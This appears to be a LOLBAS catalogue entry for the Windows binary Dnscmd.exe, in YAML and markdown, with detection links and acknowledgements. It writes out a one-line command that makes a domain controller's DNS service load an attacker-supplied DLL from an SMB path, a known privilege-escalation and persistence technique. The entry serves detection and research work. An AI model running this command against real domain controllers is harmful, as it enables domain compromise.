---
Acknowledgement:
- Person: Shay Ber
- Handle: '@dim0x69'
  Person: Dimitrios Slamaris
- Person: Nikhil SamratAs
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
  Description: Adds a specially crafted DLL as a plug-in of the DNS Service. This
    command must be run on a DC by a user that is at least a member of the DnsAdmins
    group. See the reference links for DLL details.
  MitreID: T1543.003
  OperatingSystem: Windows server
  Privileges: DNS admin
  Tags:
  - Execute: DLL
  - Execute: Remote
  Usecase: Remotely inject dll to dns server
Created: 2018-05-25
Description: A command-line interface for managing DNS servers
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_dnscmd_install_new_server_level_plugin_dll.yml
- IOC: Dnscmd.exe loading dll from UNC/arbitrary path
Full_Path:
- Path: C:\Windows\System32\Dnscmd.exe
- Path: C:\Windows\SysWOW64\Dnscmd.exe
Name: Dnscmd.exe
Resources:
- Link: https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
- Link: https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html
- Link: https://github.com/dim0x69/dns-exe-persistance/tree/master/dns-plugindll-vcpp
- Link: https://twitter.com/Hexacorn/status/994000792628719618
- Link: http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html
mitre_data:
  technique_ids:
  - T1543.003
tags:
- lolbas/osbinaries
---

# Dnscmd.exe

A command-line interface for managing DNS servers

# Path(s)

- `C:\Windows\System32\Dnscmd.exe`
- `C:\Windows\SysWOW64\Dnscmd.exe`

# Execute Commands

Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.

```batch
dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
```

- **Usecase:** Remotely inject dll to dns server
- **Privileges Required:** DNS admin
- **MitreID:** `T1543.003`
- **Operating System(s):** Windows server



# Resource(s)

- https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
- https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html
- https://github.com/dim0x69/dns-exe-persistance/tree/master/dns-plugindll-vcpp
- https://twitter.com/Hexacorn/status/994000792628719618
- http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Shay Ber
- Dimitrios Slamaris (@dim0x69)
- Nikhil SamratAs